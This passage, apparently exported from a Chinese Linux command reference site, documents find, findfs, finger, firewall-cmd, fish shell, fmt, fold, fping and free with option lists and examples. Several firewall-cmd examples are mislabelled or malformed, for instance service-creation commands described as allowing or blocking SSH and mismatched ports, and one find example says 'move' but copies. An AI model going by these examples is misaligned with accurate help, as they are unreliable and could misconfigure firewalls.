-10k\n```\n\n搜索等于10KB的文件\n\n```shell\nfind . -type f -size 10k\n```\n\n#### 删除匹配文件\n\n删除当前目录下所有.txt文件\n\n```shell\nfind . -type f -name \"*.txt\" -delete\n```\n\n#### 根据文件权限/所有权进行匹配\n\n当前目录下搜索出权限为777的文件\n\n```shell\nfind . -type f -perm 777\n```\n\n找出当前目录下权限不是644的php文件\n\n```shell\nfind . -type f -name \"*.php\" ! -perm 644\n```\n\n找出当前目录用户tom拥有的所有文件\n\n```shell\nfind . -type f -user tom\n```\n\n找出当前目录用户组sunk拥有的所有文件\n\n```shell\nfind . -type f -group sunk\n```\n\n#### 借助`-exec`选项与其他命令结合使用\n\n找出当前目录下所有root的文件，并把所有权更改为用户tom\n\n```shell\nfind .-type f -user root -exec chown tom {} \\;\n```\n\n上例中， **{}**  用于与 **-exec** 选项结合使用来匹配所有文件，然后会被替换为相应的文件名。\n\n找出自己家目录下所有的.txt文件并删除\n\n```shell\nfind $HOME/. -name \"*.txt\" -ok rm {} \\;\n```\n\n上例中， **-ok** 和 **-exec** 行为一样，不过它会给出提示，是否执行相应的操作。\n\n查找当前目录下所有.txt文件并把他们拼接起来写入到all.txt文件中\n\n```shell\nfind . -type f -name \"*.txt\" -exec cat {} \\;> /all.txt\n```\n\n将30天前的.log文件移动到old目录中\n\n```shell\nfind . -type f -mtime +30 -name \"*.log\" -exec cp {} old \\;\n```\n\n找出当前目录下所有.txt文件并以“File:文件名”的形式打印出来\n\n```shell\nfind . -type f -name \"*.txt\" -exec printf \"File: %s\\n\" {} \\;\n```\n\n因为单行命令中-exec参数中无法使用多个命令，以下方法可以实现在-exec之后接受多条命令\n\n```shell\n-exec ./text.sh {} \\;\n```\n\n#### 搜索但跳过指定的目录\n\n查找当前目录或者子目录下所有.txt文件，但是跳过子目录sk\n\n```shell\nfind . -path \"./sk\" -prune -o -name \"*.txt\" -print\n```\n\n> :warning: ./sk 不能写成 ./sk/ ，否则没有作用。\n\n忽略两个目录\n\n```shell\nfind . \\( -path ./sk -o  -path ./st \\) -prune -o -name \"*.txt\" -print\n```\n\n> :warning: 如果写相对路径必须加上`./`\n\n#### find其他技巧收集\n\n要列出所有长度为零的文件\n\n```shell\nfind . -empty\n```\n\n#### 其它实例\n\n```shell\nfind ~ -name '*jpg' # 主目录中找到所有的 jpg 文件。 -name 参数允许你将结果限制为与给定模式匹配的文件。\nfind ~ -iname '*jpg' # -iname 就像 -name，但是不区分大小写\nfind ~ ( -iname 'jpeg' -o -iname 'jpg' ) # 一些图片可能是 .jpeg 扩展名。幸运的是，我们可以将模式用“或”（表示为 -o）来组合。\nfind ~ \\( -iname '*jpeg' -o -iname '*jpg' \\) -type f # 如果你有一些以 jpg 结尾的目录呢？ （为什么你要命名一个 bucketofjpg 而不是 pictures 的目录就超出了本文的范围。）我们使用 -type 参数修改我们的命令来查找文件。\nfind ~ \\( -iname '*jpeg' -o -iname '*jpg' \\) -type d # 也许你想找到那些命名奇怪的目录，以便稍后重命名它们\n```\n\n最近拍了很多照片，所以让我们把它缩小到上周更改的文件\n\n```shell\nfind ~ \\( -iname '*jpeg' -o -iname '*jpg' \\) -type f -mtime -7\n```\n\n你可以根据文件状态更改时间 （ctime）、修改时间 （mtime） 或访问时间 （atime） 来执行时间过滤。 这些是在几天内，所以如果你想要更细粒度的控制，你可以表示为在几分钟内（分别是 cmin、mmin 和 amin）。 除非你确切地知道你想要的时间，否则你可能会在 + （大于）或 - （小于）的后面加上数字。\n\n但也许你不关心你的照片。也许你的磁盘空间不够用，所以你想在 log 目录下找到所有巨大的（让我们定义为“大于 1GB”）文件：\n\n```shell\nfind /var/log -size +1G\n```\n\n或者，也许你想在 /data 中找到 bcotton 拥有的所有文件：\n\n```shell\nfind /data -owner bcotton\n```\n\n你还可以根据权限查找文件。也许你想在你的主目录中找到对所有人可读的文件，以确保你不会过度分享。\n\n```shell\nfind ~ -perm -o=r\n```\n\n删除 mac 下自动生成的文件\n\n```shell\nfind ./ -name '__MACOSX' -depth -exec rm -rf {} \\;\n```\n\n统计代码行数\n\n```shell\nfind . -name \"*.java\"|xargs cat|grep -v ^$|wc -l # 代码行数统计, 排除空行\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","find"]},{"title":"【Linux 命令】findfs","url":"/linux-command/findfs/","content":"\n标签或UUID查找文件系统\n\n## 补充说明\n\n**findfs命令** 依据卷标（Label）和UUID查找文件系统所对应的设备文件。findfs命令会搜索整个磁盘，看是否有匹配的标签或者UUID没有，如果有则打印到标注输出上。findfs命令也是e2fsprogs项目的一部分。\n\n###  语法\n\n```shell\nfindfs(参数)\n```\n\n###  参数\n\n`LABEL=<卷标>`或者`UUID=<UUID>`：按照卷标或者UUID查询文件系统。\n\n###  实例\n\n通过卷标名查找对应的文件系统：\n\n```shell\nfindfs LABEL=/boot\n/dev/hda1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","findfs"]},{"title":"【Linux 命令】finger","url":"/linux-command/finger/","content":"\n用于查找并显示用户信息\n\n## 补充说明\n\n**finger命令** 用于查找并显示用户信息。包括本地与远端主机的用户皆可，帐号名称没有大小写的差别。单独执行finger指令，它会显示本地主机现在所有的用户的登陆信息，包括帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话。\n\n###  语法\n\n```shell\nfinger(选项)(参数)\n```\n\n###  选项\n\n```shell\n-l：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的Shell，登入时间，转信地址，电子邮件状态，还有计划文件和方案文件内容；\n-m：排除查找用户的真实姓名；\n-s：列出该用户的帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话；\n-p：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的Shell，登入时间，转信地址，电子邮件状态，但不显示该用户的计划文件和方案文件内容。\n```\n\n不指定finger的选项如果提供操作者的话，缺省设为`-l`输出风格，否则为`-s`风格，注意在两种格式中，如果信息不足，都有一些域可能丢失，如果没有指定参数finger会为当前登录的每个用户打印一个条目。\n\n###  参数\n\n用户名：指定要查询信息的用户。\n\n###  实例\n\n在计算机上使用finger：\n\n```shell\n[root@localhost root]# finger\nlogin Name Tty Idle Login time Office Office Phone\nroot root tty1 2 Dec 18 13\nroot root pts/0 1 Dec 18 13\nroot root *pts/1 Dec 18 13\n```\n\n如果要查询远程机上的用户信息，需要在用户名后面接`@主机名`，采用`用户名@主机名`的格式，不过要查询的网络主机需要运行finger守护进程的支持。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","finger"]},{"title":"【Linux 命令】firewall-cmd","url":"/linux-command/firewall-cmd/","content":"\nLinux上新用的防火墙软件，跟iptables差不多的工具\n\n## 补充说明\n\nfirewall-cmd 是 firewalld的字符界面管理工具，firewalld是centos7的一大特性，最大的好处有两个：支持动态更新，不用重启服务；第二个就是加入了防火墙的“zone”概念。\n\nfirewalld跟iptables比起来至少有两大好处：\n\n1. firewalld可以动态修改单条规则，而不需要像iptables那样，在修改了规则后必须得全部刷新才可以生效。\n2. firewalld在使用上要比iptables人性化很多，即使不明白“五张表五条链”而且对TCP/IP协议也不理解也可以实现大部分功能。\n\nfirewalld自身并不具备防火墙的功能，而是和iptables一样需要通过内核的netfilter来实现，也就是说firewalld和 iptables一样，他们的作用都是用于维护规则，而真正使用规则干活的是内核的netfilter，只不过firewalld和iptables的结 构以及使用方法不一样罢了。\n\n**命令格式** \n \n```shell\nfirewall-cmd [选项 ... ]\n```\n\n### 选项\n\n通用选项\n\n```shell\n-h, --help    # 显示帮助信息；\n-V, --version # 显示版本信息. （这个选项不能与其他选项组合）；\n-q, --quiet   # 不打印状态消息；\n```\n\n状态选项\n\n```shell\n--state                # 显示firewalld的状态；\n--reload               # 不中断服务的重新加载；\n--complete-reload      # 中断所有连接的重新加载；\n--runtime-to-permanent # 将当前防火墙的规则永久保存；\n--check-config         # 检查配置正确性；\n```\n\n日志选项\n\n```shell\n--get-log-denied         # 获取记录被拒绝的日志；\n--set-log-denied=<value> # 设置记录被拒绝的日志，只能为 'all','unicast','broadcast','multicast','off' 其中的一个；\n```\n\n###  实例\n\n```shell\n# 安装firewalld\nyum install firewalld firewall-config\n\nsystemctl start  firewalld # 启动\nsystemctl stop firewalld  # 停止\nsystemctl enable firewalld # 启用自动启动\nsystemctl disable firewalld # 禁用自动启动\nsystemctl status firewalld # 或者 firewall-cmd --state 查看状态\n\n# 关闭服务的方法\n# 你也可以关闭目前还不熟悉的FirewallD防火墙，而使用iptables，命令如下：\n\nsystemctl stop firewalld\nsystemctl disable firewalld\nyum install iptables-services\nsystemctl start iptables\nsystemctl enable iptables\n```\n\n配置firewalld\n\n```shell\nfirewall-cmd --version  # 查看版本\nfirewall-cmd --help     # 查看帮助\n\n# 查看设置：\nfirewall-cmd --state  # 显示状态\nfirewall-cmd --get-active-zones  # 查看区域信息\nfirewall-cmd --get-zone-of-interface=eth0  # 查看指定接口所属区域\nfirewall-cmd --panic-on  # 拒绝所有包\nfirewall-cmd --panic-off  # 取消拒绝状态\nfirewall-cmd --query-panic  # 查看是否拒绝\n\nfirewall-cmd --reload # 更新防火墙规则\nfirewall-cmd --complete-reload\n# 两者的区别就是第一个无需断开连接，就是firewalld特性之一动态添加规则，第二个需要断开连接，类似重启服务\n\n\n# 将接口添加到区域，默认接口都在public\nfirewall-cmd --zone=public --add-interface=eth0\n# 永久生效再加上 --permanent 然后reload防火墙\n \n# 设置默认接口区域，立即生效无需重启\nfirewall-cmd --set-default-zone=public\n\n# 查看所有打开的端口：\nfirewall-cmd --zone=dmz --list-ports\n\n# 加入一个端口到区域：\nfirewall-cmd --zone=dmz --add-port=8080/tcp\n# 若要永久生效方法同上\n \n# 打开一个服务，类似于将端口可视化，服务需要在配置文件中添加，/etc/firewalld 目录下有services文件夹，这个不详细说了，详情参考文档\nfirewall-cmd --zone=work --add-service=smtp\n \n# 移除服务\nfirewall-cmd --zone=work --remove-service=smtp\n\n# 显示支持的区域列表\nfirewall-cmd --get-zones\n\n# 设置为家庭区域\nfirewall-cmd --set-default-zone=home\n\n# 查看当前区域\nfirewall-cmd --get-active-zones\n\n# 设置当前区域的接口\nfirewall-cmd --get-zone-of-interface=enp03s\n\n# 显示所有公共区域（public）\nfirewall-cmd --zone=public --list-all\n\n# 临时修改网络接口（enp0s3）为内部区域（internal）\nfirewall-cmd --zone=internal --change-interface=enp03s\n\n# 永久修改网络接口enp03s为内部区域（internal）\nfirewall-cmd --permanent --zone=internal --change-interface=enp03s\n```\n\n服务管理\n\n```shell\n# 显示服务列表  \nAmanda, FTP, Samba和TFTP等最重要的服务已经被FirewallD提供相应的服务，可以使用如下命令查看：\n\nfirewall-cmd --get-services\n\n# 允许SSH服务通过\nfirewall-cmd --new-service=ssh\n\n# 禁止SSH服务通过\nfirewall-cmd --delete-service=ssh\n\n# 打开TCP的8080端口\nfirewall-cmd --enable ports=8080/tcp\n\n# 临时允许Samba服务通过600秒\nfirewall-cmd --enable service=samba --timeout=600\n\n# 显示当前服务\nfirewall-cmd --list-services\n\n# 添加HTTP服务到内部区域（internal）\nfirewall-cmd --permanent --zone=internal --add-service=http\nfirewall-cmd --reload     # 在不改变状态的条件下重新加载防火墙\n```\n\n端口管理\n\n```shell\n# 打开443/TCP端口\nfirewall-cmd --add-port=443/tcp\n\n# 永久打开3690/TCP端口\nfirewall-cmd --permanent --add-port=3690/tcp\n\n# 永久打开端口好像需要reload一下，临时打开好像不用，如果用了reload临时打开的端口就失效了\n# 其它服务也可能是这样的，这个没有测试\nfirewall-cmd --reload\n\n# 查看防火墙，添加的端口也可以看到\nfirewall-cmd --list-all\n```\n\n直接模式\n\n```shell\n# FirewallD包括一种直接模式，使用它可以完成一些工作，例如打开TCP协议的9999端口\n\nfirewall-cmd --direct -add-rule ipv4 filter INPUT 0 -p tcp --dport 9000 -j ACCEPT\nfirewall-cmd --reload\n```\n\n**自定义服务管理**\n\n选项\n\n```shell\n（末尾带有 [P only] 的话表示该选项除了与（--permanent）之外，不能与其他选项一同使用！）\n--new-service=<服务名> 新建一个自定义服务 [P only]\n--new-service-from-file=<文件名> [--name=<服务名>]\n                      从文件中读取配置用以新建一个自定义服务 [P only]\n--delete-service=<服务名>\n                      删除一个已存在的服务 [P only]\n--load-service-defaults=<服务名>\n                      Load icmptype default settings [P only]\n--info-service=<服务名>\n                      显示该服务的相关信息\n--path-service=<服务名>\n                      显示该服务的文件的相关路径 [P only]\n--service=<服务名> --set-description=<描述>\n                      给该服务设置描述信息 [P only]\n--service=<服务名> --get-description\n                      显示该服务的描述信息 [P only]\n--service=<服务名> --set-short=<描述>\n                      给该服务设置一个简短的描述 [P only]\n--service=<服务名> --get-short\n                      显示该服务的简短描述 [P only]\n                      \n--service=<服务名> --add-port=<端口号>[-<端口号>]/<protocol>\n                      给该服务添加一个新的端口(端口段) [P only]\n                      \n--service=<服务名> --remove-port=<端口号>[-<端口号>]/<protocol>\n                      从该服务上移除一个端口(端口段) [P only]\n                      \n--service=<服务名> --query-port=<端口号>[-<端口号>]/<protocol>\n                      查询该服务是否添加了某个端口(端口段) [P only]\n                      \n--service=<服务名> --get-ports\n                      显示该服务添加的所有端口 [P only]\n                      \n--service=<服务名> --add-protocol=<protocol>\n                      为该服务添加一个协议 [P only]\n                      \n--service=<服务名> --remove-protocol=<protocol>\n                      从该服务上移除一个协议 [P only]\n                      \n--service=<服务名> --query-protocol=<protocol>\n                      查询该服务是否添加了某个协议 [P only]\n                      \n--service=<服务名> --get-protocols\n                      显示该服务添加的所有协议 [P only]\n                      \n--service=<服务名> --add-source-port=<端口号>[-<端口号>]/<protocol>\n                      添加新的源端口(端口段)到该服务 [P only]\n                      \n--service=<服务名> --remove-source-port=<端口号>[-<端口号>]/<protocol>\n                      从该服务中删除源端口(端口段) [P only]\n                      \n--service=<服务名> --query-source-port=<端口号>[-<端口号>]/<protocol>\n                      查询该服务是否添加了某个源端口(端口段) [P only]\n                      \n--service=<服务名> --get-source-ports\n                      显示该服务所有源端口 [P only]\n                      \n--service=<服务名> --add-module=<module>\n                      为该服务添加一个模块 [P only]\n--service=<服务名> --remove-module=<module>\n                      为该服务移除一个模块 [P only]\n--service=<服务名> --query-module=<module>\n                      查询该服务是否添加了某个模块 [P only]\n--service=<服务名> --get-modules\n                      显示该服务添加的所有模块 [P only]\n--service=<服务名> --set-destination=<ipv>:<address>[/<mask>]\n                      Set destination for ipv to address in service [P only]\n--service=<服务名> --remove-destination=<ipv>\n                      Disable destination for ipv i service [P only]\n--service=<服务名> --query-destination=<ipv>:<address>[/<mask>]\n                      Return whether destination ipv is set for service [P only]\n--service=<服务名> --get-destinations\n                      List destinations in service [P only]\n```\n\n\n**控制端口 / 服务**\n\n可以通过两种方式控制端口的开放，一种是指定端口号另一种是指定服务名。虽然开放 http 服务就是开放了 80 端口，但是还是不能通过端口号来关闭，也就是说通过指定服务名开放的就要通过指定服务名关闭；通过指定端口号开放的就要通过指定端口号关闭。还有一个要注意的就是指定端口的时候一定要指定是什么协议，tcp 还是 udp。知道这个之后以后就不用每次先关防火墙了，可以让防火墙真正的生效。\n\n```shell\nfirewall-cmd --add-service=mysql        # 开放mysql端口\nfirewall-cmd --remove-service=http      # 阻止http端口\nfirewall-cmd --list-services            # 查看开放的服务\nfirewall-cmd --add-port=3306/tcp        # 开放通过tcp访问3306\nfirewall-cmd --remove-port=80tcp        # 阻止通过tcp访问3306\nfirewall-cmd --add-port=233/udp         # 开放通过udp访问233\nfirewall-cmd --list-ports               # 查看开放的端口\n```\n\n伪装 IP\n\n```shell\nfirewall-cmd --query-masquerade # 检查是否允许伪装IP\nfirewall-cmd --add-masquerade   # 允许防火墙伪装IP\nfirewall-cmd --remove-masquerade# 禁止防火墙伪装IP\n```\n\n**端口转发**\n\n端口转发可以将指定地址访问指定的端口时，将流量转发至指定地址的指定端口。转发的目的如果不指定 ip 的话就默认为本机，如果指定了 ip 却没指定端口，则默认使用来源端口。\n如果配置好端口转发之后不能用，可以检查下面两个问题：\n1. 比如我将 80 端口转发至 8080 端口，首先检查本地的 80 端口和目标的 8080 端口是否开放监听了\n2. 其次检查是否允许伪装 IP，没允许的话要开启伪装 IP\n\n```shell\nfirewall-cmd --add-forward-port=port=80:proto=tcp:toport=8080   # 将80端口的流量转发至8080\nfirewall-cmd --add-forward-port=port=80:proto=tcp:toaddr=192.168.0.1 # 将80端口的流量转发至192.168.0.1\nfirewall-cmd --add-forward-port=port=80:proto=tcp:toaddr=192.168.0.1:toport=8080 # 将80端口的流量转发至192.168.0.1的8080端口\n```\n\n1. 当我们想把某个端口隐藏起来的时候，就可以在防火墙上阻止那个端口访问，然后再开一个不规则的端口，之后配置防火墙的端口转发，将流量转发过去。\n2. 端口转发还可以做流量分发，一个防火墙拖着好多台运行着不同服务的机器，然后用防火墙将不同端口的流量转发至不同机器。\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","firewall-cmd"]},{"title":"【Linux 命令】fishshell","url":"/linux-command/fishshell/","content":"\n比 bash 更好用的 shell\n\n## 安装\n\n```shell\n# Ubuntu 和 Debian 的安装方法。\nsudo apt-get install fish\n# Mac 的安装方法。\nbrew install fish\n```\n\n## 启动与帮助\n\n由于 `Fish` 的语法与 `Bash` 有很大差异，`Bash` 脚本一般不兼容。因此，建议不要将 `Fish` 设为默认 `Shell`，而是每次手动启动它。\n\n```shell\n# 安装完成后，就可以启动 Fish。\n$ fish\n# 使用过程中，如果需要帮助，可以输入 help 命令\n$ help\n```\n\n## 彩色显示\n\n```shell\n# 无效命令为红色\n$ mkd\n# 有效命令为蓝色\n$ mkdir\n# 有效路径会有下划线。如果没有下划线，你就知道这个路径不存在。\n$ cat ~/somefi \n```\n\n## 自动建议\n\nFish 会自动在光标后面给出建议，表示可能的选项，颜色为灰色。如果采纳建议，可以按下 `→` 或 `Control + F` 。如果只采纳一部分，可以按下 `Alt + →`。\n\n```shell\n$ /bin/hostname # 命令建议\n$ grep --ignore-case # 参数建议\n$ ls node_modules # 路径建议\n```\n\n## 自动补全\n\n输入命令时，`Fish` 会自动显示匹配的上一条历史记录。如果没有匹配的历史记录，`Fish` 会猜测可能的结果，自动补全各种输入。比如，输入 `pyt` 再按下 `Tab` ，就会自动补全为 `python` 命令。\n\n`Fish` 还可以自动补全 `Git` 分支。\n\n## 脚本语法\n\n### if 语句\n\n```shell\nif grep fish /etc/shells\n    echo Found fish\nelse if grep bash /etc/shells\n    echo Found bash\nelse\n    echo Got nothing\nend\n```\n\n### switch 语句\n\n```shell\nswitch (uname)\ncase Linux\n    echo Hi Tux!\ncase Darwin\n    echo Hi Hexley!\ncase FreeBSD NetBSD DragonFly\n    echo Hi Beastie!\ncase '*'\n    echo Hi, stranger!\nend\n```\n\n### while 循环\n\n```shell\nwhile true\n    echo \"Loop forever\"\nend\n```\n\n### for 循环\n\n```shell\nfor file in *.txt\n    cp $file $file.bak\nend\n```\n\n### 函数\n\n`Fish` 的函数用来封装命令，或者为现有的命令起别名。\n\n```shell\nfunction ll\n    ls -lhG $argv\nend\n```\n\n上面代码定义了一个 `ll` 函数。命令行执行这个函数以后，就可以用 `ll` 命令替代 `ls -lhG`。其中，变量 `$argv` 表示函数的参数。\n\n```shell\nfunction ls\n    command ls -hG $argv\nend\n```\n\n上面的代码重新定义 `ls` 命令。注意，函数体内的 `ls` 之前，要加上 `command`，否则会因为无限循环而报错。\n\n### 提示符\n\n`fish_prompt` 函数用于定义命令行提示符（prompt）。\n\n```shell\nfunction fish_prompt\n  set_color purple\n  date \"+%m/%d/%y\"\n  set_color FF0\n  echo (pwd) '>'\n  set_color normal\nend\n```\n\n执行上面的函数以后，你的命令行提示符就会变成下面这样。\n\n```\n02/06/13\n/home/tutorial > \n```\n\n## 配置\n\nFish 的配置文件是 `~/.config/fish/config.fish`，每次 `Fish` 启动，就会自动加载这个文件。Fish 还提供 Web 界面配置该文件。\n\n```shell\n$ fish_config # 浏览器打开 Web 界面配置\n```\n\nRunning Commands: 兼容 bash 等shell的命令执行方式  \nGetting Help: `help/man cmd -> browser/terminal`  \nSyntax Highlighting: 实时检查命令是否正确  \nWildcards: 支持缩写  `*` 递归 匹配  \nPipes and Redirections: 使用 `^` 代表 stderr  \nAutosuggestions: 自动建议, 可以使用 `Ctrl-f / ->` 来补全  \nTab Completions: 更强大的 tab 补全  \nVariables: 使用 set 设置  \nExit Status: 使用 `echo $status` 替代 `$?`  \nExports (Shell Variables)  \nLists: all variables in fish are really lists  \nCommand Substitutions: 使用 `(cmd)` 来执行命令, 而不是 反引号、`$()`  \nCombiners (And, Or, Not): 不支持使用符合来表示逻辑运算  \nFunctions：使用 `$argv` 替代 `$1`  \nConditionals (If, Else, Switch) / Functions / Loops: 更人性化的写法(参考 py)  \nPrompt: `function fish_prompt` 实现  \nStartup (Where's .bashrc?): `~/.config/fish/config.fish`，更好的方式是 autoloading-function、universal-variables  \nAutoloading Functions: ` ~/.config/fish/functions/.`  \nUniversal Variables：a variable whose value is shared across all instances of fish  \n\n```shell\nset name 'czl' # 设置变量，替代 name=czl\necho $name\necho $status # exit status，替代 $?\nenv # 环境变量\nset -x MyVariable SomeValue # 替代 export\nset -e MyVariable\nset PATH $PATH /usr/local/bin # 使用 lists 记录 PATH\nset -U fish_user_paths /usr/local/bin $fish_user_paths # 永久生效\ntouch \"testing_\"(date +%s)\".txt\" # command subtitution，替代 `date +%s`\ncp file.txt file.txt.bak; and echo 'back success'; or echo 'back fail' # combiner\nfunctions # 列出 fish 下定义的函数\n```\n\n## 参考资料\n\n- [fish-shell官网](http://fishshell.com)","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fishshell"]},{"title":"【Linux 命令】fmt","url":"/linux-command/fmt/","content":"\n读取文件后优化处理并输出\n\n## 补充说明\n\n**fmt命令** 读取文件的内容，根据选项的设置对文件格式进行简单的优化处理，并将结果送到标准输出设备。\n\n###  语法\n\n```shell\nfmt(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c或--crown-margin：每段前两列缩排；\n-p<列起始字符串>或-prefix=<列起始字符串>：仅合并含有指定字符串的列，通常运用在程序语言的注解方面；\n-s或--split-only：只拆开字数超出每列字符数的列，但不合并字数不足每列字符数的列；\n-t或--tagged-paragraph：每列前两列缩排，但第1列和第2列的缩排格式不同；\n-u或--uniform-spacing：每列字符之间都以一个空格字符间隔，每个句子之间则两个空格字符分隔；\n-w<每列字符数>或--width=<每列字符数>或-<每列字符数>：设置每列的最大字符数。\n```\n\n###  参数\n\n指定要优化格式的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fmt"]},{"title":"【Linux 命令】fold","url":"/linux-command/fold/","content":"\n控制文件内容输出时所占用的屏幕宽度\n\n## 补充说明\n\n**fold命令** 用于控制文件内容输出时所占用的屏幕宽度。fold命令会从指定的文件里读取内容，将超过限定列宽的列加入增列字符后，输出到标准输出设备。若不指定任何文件名称，或是所给予的文件名为“-”，则fold指令会从标准输入设备读取数据。\n\n###  语法\n\n```shell\nfold(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b或——bytes：以Byte为单位计算列宽，而非采用行数编号为单位；\n-s或——spaces：以空格字符作为换列点；\n-w<每列行数>或--width<每列行数>：设置每列的最大行数。\n```\n\n###  参数\n\n文件：指定要显示内容的文件。\n\n###  示例\n\n```shell\nfold -w 5 filename\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fold"]},{"title":"【Linux 命令】fping","url":"/linux-command/fping/","content":"\nfping检测主机是否存在\n\n## 补充说明\n\n**fping命令** fping类似于ping，但比ping强大。与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping，fping还可以在命令行中指定要ping的主机数量范围。\n\n### 语法\n\n```shell\nfping(选项)(参数)\n```\n\n### 选项\n\n```shell\n-a  # 显示存活的主机\n-b  # ping 数据包的大小。（默认为56）\n-c  # ping每个目标的次数 (默认为1)\n-f  # 从文件获取目标列表(不能与 -g 同时使用)\n-l  # 循环发送ping\n-g  # 通过指定开始和结束地址来生成目标列表,可以使网段\n-u  # 显示不可到达的目标\n```\n\n### 实例\n\n安装fping命令：\n\n```shell\n# 先安装epel源：\nyum install epel* -y\n# 安装fping包：\nyum install fping -y\n```\n\n选择性ping指定ip：\n\n```shell\n~]# fping 192.168.0.1 192.168.0.125 192.168.0.126 2>/dev/null\n192.168.0.1 is alive\n192.168.0.125 is alive\n192.168.0.126 is unreachable\n```\n\nping整个网段：\n\n```bash\n~]# fping -g 192.168.0.0/24 2>/dev/null\n192.168.0.1 is alive\n192.168.0.103 is alive\n...\n192.168.0.253 is unreachable\n192.168.0.254 is unreachable\n```\n\nping整个网段，只显示存活的主机：\n\n```shell\n~]# fping -ag 192.168.0.0/24 2>/dev/null\n192.168.0.1\n192.168.0.103\n...\n```\n\nping某一段ip：\n\n```shell\n~]# fping -ag 192.168.0.5 192.168.0.130 2>/dev/null\n192.168.0.103\n...\n192.168.0.125\n192.168.0.130\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fping"]},{"title":"【Linux 命令】free","url":"/linux-command/free/","content":"\n显示内存的使用情况\n\n## 补充说明\n\n**free命令** 可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。\n\n###  语法 \n\n```shell\nfree(选项)\n```\n\n###  选项 \n\n```shell\n-b # 以Byte为单位显示内存使用情况；\n-k # 以KB为单位显示内存使用情况；\n-m # 以MB为单位显示内存使用情况；\n-g # 以GB为单位显示内存使用情况。 \n-o # 不显示缓冲区调节列；\n-s<间隔秒数> # 持续观察内存使用状况；\n-t # 显示内存总和列；\n-V # 显示版本信息。\n```\n\n###  实例 \n\n```shell\nfree -t    # 以总和的形式显示内存的使用信息\nfree -s 10 # 周期性的查询内存使用信息，每10s 执行一次命令\n```\n\n显示内存使用情况\n\n```shell\nfree -m\n             total       used       free     shared    buffers     cached\nMem:          2016       1973         42          0        163       1497\n-/+ buffers/cache:        312       1703\nSwap:         4094          0       4094\n```\n\n **第一部分Mem行解释：** \n\n```shell\ntotal：内存总数；\nused：已经使用的内存数；\nfree：空闲的内存数；\nshared：当前已经废弃不用；\nbuffers Buffer：缓存内存数；\ncached Page：缓存内存数。\n```\n\n关系：total = used + free\n\n **第二部分(-/+ buffers/cache)解释:** \n\n```shell\n(-buffers/cache) used内存数：第一部分Mem行中的 used – buffers – cached\n(+buffers/cache) free内存数: 第一部分Mem行中的 free + buffers + cached\n```\n\n可见-buffers/cache反映的是被程序实实在在吃掉的内存，而+buffers/cache反映的是可以挪用的内存总数。\n\n第三部分是指交换分区。\n\n输出结果的第四行是交换分区SWAP的，也就是我们通常所说的虚拟内存。\n区别：第二行(mem)的used/free与第三行(-/+ buffers/cache) used/free的区别。 这两个的区别在于使用的角度来看，第一行是从OS的角度来看，因为对于OS，buffers/cached 都是属于被使用，所以他的可用内存是2098428KB,已用内存是30841684KB,其中包括，内核（OS）使用+Application(X, oracle,etc)使用的+buffers+cached.\n\n第三行所指的是从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为buffer/cached是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached会很快地被回收。\n\n所以从应用程序的角度来说，可用内存=系统free memory+buffers+cached。\n如本机情况的可用内存为：\n\n18007156=2098428KB+4545340KB+11363424KB\n\n接下来解释什么时候内存会被交换，以及按什么方交换。 \n\n当可用内存少于额定值的时候，就会开会进行交换。如何看额定值：\n\n```shell\ncat /proc/meminfo\n\nMemTotal:       16140816 kB\nMemFree:          816004 kB\nMemAvailable:    2913824 kB\nBuffers:           17912 kB\nCached:          2239076 kB\nSwapCached:            0 kB\nActive:         12774804 kB\nInactive:        1594328 kB\nActive(anon):   12085544 kB\nInactive(anon):    94572 kB\nActive(file):     689260 kB\nInactive(file):  1499756 kB\nUnevictable:      116888 kB\nMlocked:          116888 kB\nSwapTotal:       8191996 kB\nSwapFree:        8191996 kB\nDirty:                56 kB\nWriteback:             0 kB\nAnonPages:      12229228 kB\nMapped:           117136 kB\nShmem:             58736 kB\nSlab:             395568 kB\nSReclaimable:     246700 kB\nSUnreclaim:       148868 kB\nKernelStack:       30496 kB\nPageTables:       165104 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    16262404 kB\nCommitted_AS:   27698600 kB\nVmallocTotal:   34359738367 kB\nVmallocUsed:      311072 kB\nVmallocChunk:   34350899200 kB\nHardwareCorrupted:     0 kB\nAnonHugePages:   3104768 kB\nHugePages_Total:       0\nHugePages_Free:        0\nHugePages_Rsvd:        0\nHugePages_Surp:        0\nHugepagesize:       2048 kB\nDirectMap4k:      225536 kB\nDirectMap2M:    13279232 kB\nDirectMap1G:     5242880 kB\n```\n\n交换将通过三个途径来减少系统中使用的物理页面的个数：　\n \n1. 减少缓冲与页面cache的大小， \n2. 将系统V类型的内存页面交换出去，　 \n3. 换出或者丢弃页面。(Application 占用的内存页，也就是物理内存不足）。 \n\n事实上，少量地使用swap是不是影响到系统性能的。\n\n那buffers和cached都是缓存，两者有什么区别呢？\n\n为了提高磁盘存取效率, Linux做了一些精心的设计, 除了对dentry进行缓存(用于VFS,加速文件路径名到inode的转换), 还采取了两种主要Cache方式：\n\nBuffer Cache和Page Cache。前者针对磁盘块的读写，后者针对文件inode的读写。这些Cache有效缩短了 I/O系统调用(比如read,write,getdents)的时间。\n磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种Cache就是分别缓存逻辑和物理级数据的。\n\nPage cache实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到page 